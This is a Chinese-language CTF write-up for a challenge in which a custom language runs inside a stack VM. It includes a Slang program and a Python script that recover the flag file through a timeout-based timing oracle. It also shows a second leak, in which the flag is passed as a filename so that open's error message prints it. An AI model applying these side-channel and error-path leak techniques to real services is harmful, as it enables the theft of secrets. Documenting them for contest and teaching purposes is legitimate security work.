# Christmas Song

## 题目简述

服务接收一段 Slang Christmas 源码，编译后在自定义栈式 VM 中执行。语言允许赋值、函数调用和类似 `switch` 的 `want` 结构，`AGAIN` 可以跳回分支起点形成死循环。四只可调用“驯鹿”对应：

| 名称 | 实际函数 |
|---|---|
| `Dancer` | `open` |
| `Dasher` | `read` |
| `Prancer` | `strncmp` |
| `Vixen` | `memcpy` |

`Rudolph` 原本对应 `write`，但题目将调用注释掉，所以没有正常输出 flag 的通道。服务端用 `subprocess.run(..., timeout=1)` 限制每次执行；这反而可以被程序中的无限循环转换为逐字符时间 oracle。

## 解题过程

### 构造前缀比较 oracle

Slang 程序先打开 `/home/ctf/flag`，读取到缓冲区，再用 `Prancer` 比较已知前缀。`strncmp` 返回 0 时进入含 `AGAIN` 的无限循环，服务约 1 秒后杀死子进程；前缀错误则立即结束。模板如下：

```text
gift flag is "/home/ctf/flag";
gift buf is "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
gift size is 40;
gift none is 0;
gift fd is 0;
gift len is 6;
gift guess is "SCTF{a";

reindeer Dancer delivering gift flag none none brings back gift fd;
reindeer Dasher delivering gift fd buf size;
reindeer Prancer delivering gift buf guess len brings back gift success;

this family wants gift success
    if the gift equal to 0:
        gift loop is 1;
        Brave reindeer! Fear no difficulties!
ok, they should already have a gift;
EOF
```

每轮把 `len` 改成候选前缀长度、`guess` 改成 `known + candidate`。服务器在所有路径都会打印 `Test complete!`，所以测量从提交源码到收到该标记的时间；约 1 秒表示正确，明显小于 1 秒表示错误。题目给出的候选字符集为字母、数字、下划线和右花括号：

```python
import string
import time

alphabet = string.ascii_letters + string.digits + "_}"
known = "SCTF{"

while not known.endswith("}"):
    for candidate in alphabet:
        source = make_slang(known + candidate)
        io = connect()
        io.sendafter(b"EOF to finish):", source.encode())
        started = time.monotonic()
        io.recvuntil(b"Test complete!")
        elapsed = time.monotonic() - started
        io.close()
        if elapsed > 0.8:
            known += candidate
            print(known)
            break
```

网络抖动可能让单次测量误判；对边界候选重复两次，或直接判断服务端是否经历 `TimeoutExpired` 对应的固定延迟会更稳定。

### open 报错的非预期输出

VM 的 `Dancer` 在 `open` 失败时执行：

```c
printf("error con't open file %s\n", arg1);
```

因此还可以先把 flag 读入缓冲区，再把该缓冲区作为文件名再次调用 `Dancer`。flag 通常不是有效路径，`open` 失败后错误消息会直接打印完整缓冲区。这条路线利用的是错误输出，而不是被禁用的 `Rudolph`。

仓库保留的本地 flag 为：

```text
SCTF{Merry_Chri5tmAs}
```

## 方法总结

本题不是普通逆向题：真正目标是利用语言允许的控制流和宿主 1 秒超时跨越“不可输出”边界，因此归入 Pwn。预期路线用 `open/read/strncmp` 构造正确前缀才超时的 oracle；更直接的路线则把 flag 当作失败文件名，借 `open` 的错误信息输出。分析语言 jail 或小型 VM 时，应把允许的宿主函数、错误路径、超时和返回值都视为潜在 I/O 通道。
